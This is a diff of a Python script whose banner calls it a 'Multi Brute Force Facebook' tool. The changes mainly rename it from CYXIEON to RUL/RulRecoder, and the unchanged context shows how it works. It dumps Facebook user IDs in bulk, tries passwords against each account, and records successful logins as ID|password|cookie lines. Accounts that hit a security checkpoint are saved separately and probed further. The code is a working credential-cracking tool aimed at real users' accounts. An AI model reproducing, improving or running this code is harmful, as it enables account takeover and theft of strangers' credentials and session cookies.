@@ -164,9 +164,9 @@ biru = '\x1b[1;94m' # WARNA-BIRU
 ses=requests.Session()
 #----------[ HAPUS ]----------#		
 def ganti_cokies():
-      try:os.remove(".cyxieoncokies.txt")
+      try:os.remove(".cok.txt")
       except:pass
-      try:os.remove(".cyxieontoken.txt")
+      try:os.remove(".token.txt")
       except:pass
       login3()
       	
@@ -174,13 +174,13 @@ def ganti_cokies():
 def banner():
       if "win" in sys.platform:os.system("cls")
       else:os.system("clear")
-      prints(panel(f'''{biru}\t ____        ______                      __         
+      print(f'''{biru}\t ____        ______                      __   
      \t / __ \__  __/ / __ \___  _________  ____/ /__  _____
     \t/ /_/ / / / / / /_/ / _ \/ ___/ __ \/ __  / _ \/ ___/
   \t/ _, _/ /_/ / / _, _/  __/ /__/ /_/ / /_/ /  __/ /    
-\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}
-\t\t• {m}Multi Brute Force Facebook{xxx} •
-\t\t {u}author by {K}RulRecoder''',width=43,title=f"[[green] RulRecoder [/]]",style=f"bold white"))
+\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/{xxx}\n
+\t\t• {m}Multi Brute Force Facebook{xxx}\n •
+\t\t {u}author by {K}RulRecoder''')
 #kukis
 def login3():
 	try:
@@ -261,7 +261,7 @@ def menu():
 		os.system('clear')
 		login3()
 		banner()
-	prints(panel(f"""[white][[cyan]1[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]2[white]] Idz Tumbal [white][[green]{uidfb} [white]]""",width=43,title=f"[[green] INFO USER [/]]",style=f"bold white"))
+	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold white"))
 	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]  ON[white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result Cp [[green] ON [white]]\n[[cyan]04[white]] Result Ok [white][[green] ON [white]] \n[[cyan]00[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
 	CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
@@ -295,7 +295,7 @@ def dump_massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] GREEZ [/]]",style=f"bold white"))
+		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] RULXD [/]]",style=f"bold white"))
 		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
 		uid.append(Masukan)
 	for user in uid:
@@ -328,8 +328,8 @@ def dump_massal():
 	      pass
 	    except requests.exceptions.ConnectionError:
 	        exit()
-	try:
-	      prints(panel(f"…⁠ᘛ⁠⁐̤⁠ᕐ⁠ᐷ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]GREEZ[/]]",style=f"bold white"))
+	try: 
+	      prints(panel(f" sedanng mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]RULXD[/]]",style=f"bold white"))
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -373,7 +373,7 @@ def dump(idt,fields,cookie,token):
 
 #----------[ HASIL-OK ]----------#            
 def hasil_ok():
-	try:vin = os.listdir('CYXIEON-OK')
+	try:vin = os.listdir('RUL-OK')
 	except FileNotFoundError:
 		print(f"{kun}╭────────────────────────────────────────────{puti}")
 		exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -385,7 +385,7 @@ def hasil_ok():
 		cih = 0
 		lol = {}
 		for isi in vin:
-			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
+			try:hem = open('RUL-OK/'+isi,'r').readlines()
 			except:continue
 			cih+=1
 			if cih<100:
@@ -402,7 +402,7 @@ def hasil_ok():
 		except KeyError:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
-		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
+		try:lin = open('RUL-OK/'+geh,'r').read().splitlines()
 		except:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -420,7 +420,7 @@ def hasil_ok():
 
 #----------[ HASIL-CP]----------#            
 def hasil_cp():
-	try:vin = os.listdir('CYXIEON-CP')
+	try:vin = os.listdir('RUL-CP')
 	except FileNotFoundError:
 		print(f"{kun}╭────────────────────────────────────────────{puti}")
 		exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -432,7 +432,7 @@ def hasil_cp():
 		cih = 0
 		lol = {}
 		for isi in vin:
-			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
+			try:hem = open('RUL-CP/'+isi,'r').readlines()
 			except:continue
 			cih+=1
 			if cih<100:
@@ -449,7 +449,7 @@ def hasil_cp():
 		except KeyError:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
-		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
+		try:lin = open('RUL-CP/'+geh,'r').read().splitlines()
 		except:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -637,15 +637,15 @@ def crackvalidate(idf,pwx,url):
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
 				print(f'{hijo}{ua}')
-				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
-				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+				open('RUL-OK/'+'RUL-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('RUL-OK/'+'RUL-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{kun}{ua}')
-				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
@@ -722,15 +722,15 @@ def crackreguler(idf,pwx,url):
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
 				print(f'{hijo}{ua}')
-				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
-				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+				open('RUL-OK/'+'RUL-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('RUL-OK/'+'RUL-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{kun}{ua}')
-				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
@@ -809,8 +809,8 @@ def crackasyinc(idf,pwx):
         tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
         print(f"{kun}╰────────────────────────────╯{puti}")
         prints(tree)
-        open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
-        open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+        open('RUL-OK/'+'RUL-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+        open('RUL-OK/'+'RUL-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
         break	
       elif "checkpoint" in po.cookies.get_dict().keys():
         print(f"{kun}╭────────────────────────────╮{puti}")
@@ -819,7 +819,7 @@ def crackasyinc(idf,pwx):
         tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
         print(f"{kun}╰────────────────────────────╯{puti}")
         prints(tree)
-        open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+        open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         akune.append(idf+'|'+pw)
         ceker(idf,pw)
         cp+=1
@@ -879,7 +879,7 @@ def ceker(idf,pw):
 			tree = Tree("")
 			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
 			prints(tree)
-			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+			#open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 			#cp+=1
 		else:
 			for opsii in opsi:
@@ -889,24 +889,16 @@ def ceker(idf,pw):
 		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
 		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
 		prints(tree)
-		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+		#open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
 		
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('CYXIEON-OK')
+	try:os.mkdir('RUL-OK')
 	except:pass
-	try:os.mkdir('CYXIEON-CP')
+	try:os.mkdir('RUL-CP')
 	except:pass
 	menu()
 	
-	
-#>>>>> THANKS TO <<<<<#
-
-#    *--> BASARI ID
-#    *--> ALVINO ADIJAYA
-#    *--> AOREC-XD
-
-#>>>>> THANKS TO <<<<<#
